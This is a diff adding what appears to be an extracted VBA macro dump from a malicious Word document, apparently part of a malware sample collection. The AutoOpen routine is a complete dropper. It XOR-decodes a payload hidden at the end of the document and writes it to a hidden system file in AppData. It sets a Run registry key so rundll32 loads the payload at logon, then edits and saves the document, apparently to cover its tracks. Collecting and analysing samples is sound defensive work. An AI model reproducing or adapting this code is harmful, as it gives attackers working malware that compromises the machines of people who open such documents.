@@ -1,0 +1,85 @@
+Filename     : ./macros/5793d2c98aabda8f8be1759f950543cd72b3b70da44a39aacbd93f7b30c49ecd
+OLE stream   : Macros/VBA/NewMacros
+VBA filename : NewMacros.bas
+----------------------------------------
+Attribute VB_Name = "NewMacros"
+Sub ADMIN()
+Attribute ADMIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ADMIN"
+    Selection.MoveUp Unit:=wdScreen, Count:=5
+    Selection.MoveDown Unit:=wdLine, Count:=4, Extend:=wdExtend
+    Selection.Delete Unit:=wdCharacter, Count:=1
+    Selection.MoveDown Unit:=wdLine, Count:=1
+    Selection.MoveRight Unit:=wdCharacter, Count:=1
+    Selection.MoveDown Unit:=wdScreen, Count:=22, Extend:=wdExtend
+    Selection.Font.Size = 12
+    Selection.MoveUp Unit:=wdLine, Count:=1
+    Selection.MoveUp Unit:=wdScreen, Count:=2
+    Selection.HomeKey Unit:=wdLine
+    Selection.HomeKey Unit:=wdLine
+    ActiveDocument.Save
+End Sub
+
+Sub AutoOpen()
+    On Error Resume Next
+    
+    Dim Path: Path = Environ("AppData")
+    Dim LastFileName: LastFileName = Path & "\Microsoft\Office" & "\OutUpdate.pip"
+    Dim Length As Long
+    Length = FileLen(LastFileName)
+
+    If (Length <> &H0) Then
+        GoTo TheEnd
+    End If
+  
+    Dim WordName: WordName = ActiveDocument.Name
+    WordName = ActiveDocument.Path & "\" & WordName
+    
+    DOCLen = FileLen(WordName)
+
+    Dim FileNameRead: FileNameRead = FreeFile
+    Dim FileWrite: FileWrite = FreeFile
+    Dim Seed: Seed = 1
+    Dim WriteLen: WriteLen = 12800
+    Dim Pos: Pos = DOCLen - WriteLen + 1
+    Dim ReadBuff(400000) As Byte
+    Dim TempSeed As Byte
+    Dim xorSeed As Long
+    xorSeed = &H5A
+
+    Open WordName For Binary As #FileNameRead
+    While (Pos < (DOCLen + 1))
+        Seek #FileNameRead, Pos
+        Get #FileNameRead, , TempSeed
+        If ((TempSeed <> &H0) And (TempSeed <> xorSeed)) Then
+            TempSeed = TempSeed Xor xorSeed
+            xorSeed = xorSeed + &HA5
+            xorSeed = xorSeed Mod &H100
+        End If
+        ReadBuff(Seed) = TempSeed
+        Pos = Pos + 1
+        Seed = Seed + 1
+    Wend
+    Close #FileNameRead
+
+    Open LastFileName For Binary As #FileWrite
+    Dim WriteSeed: WriteSeed = 1
+    While (WriteSeed < (WriteLen + 1))
+        Seek #FileWrite, WriteSeed
+        Put #FileWrite, , ReadBuff(WriteSeed)
+        WriteSeed = WriteSeed + 1
+    Wend
+    Close #FileWrite
+    
+    SetAttr LastFileName, vbHidden + vbSystem
+    
+    Dim WSH
+    Set WSH = CreateObject("Wscript.Shell")
+    WSH.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutUpdate", "rundll32 " & Chr(34) & LastFileName & Chr(34) & ",WinCred", "REG_SZ"
+    ADMIN
+    
+TheEnd:
+
+    
+End Sub
+
+
